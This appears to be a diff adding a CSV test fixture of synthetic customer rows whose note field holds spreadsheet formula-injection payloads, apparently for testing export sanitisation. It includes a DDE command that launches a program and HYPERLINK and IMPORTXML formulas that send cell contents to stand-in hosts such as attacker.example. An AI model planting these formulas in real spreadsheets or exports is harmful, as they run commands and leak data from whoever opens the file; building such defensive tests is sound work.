@@ -1,0 +1,11 @@
+id,customer_name,note,amount_inr
+1,Synthetic Customer 1,=1+1,189.95
+2,Synthetic Customer 2,=cmd|' /C calc'!A0,531.42
+3,Synthetic Customer 3,"+SUM(1,2)",823.12
+4,Synthetic Customer 4,-2+3,840.50
+5,Synthetic Customer 5,@SUM(A1:A2),493.05
+6,Synthetic Customer 6,	=1+1,114.36
+7,Synthetic Customer 7,"=1+1",603.13
+8,Synthetic Customer 8,"=HYPERLINK(""http://attacker.example/?x=""&A1,""click"")",861.08
+9,Synthetic Customer 9,"=IMPORTXML(CONCAT(""http://x.example/"",A2),""//a"")",309.43
+10,Synthetic Customer 10,-10,381.18
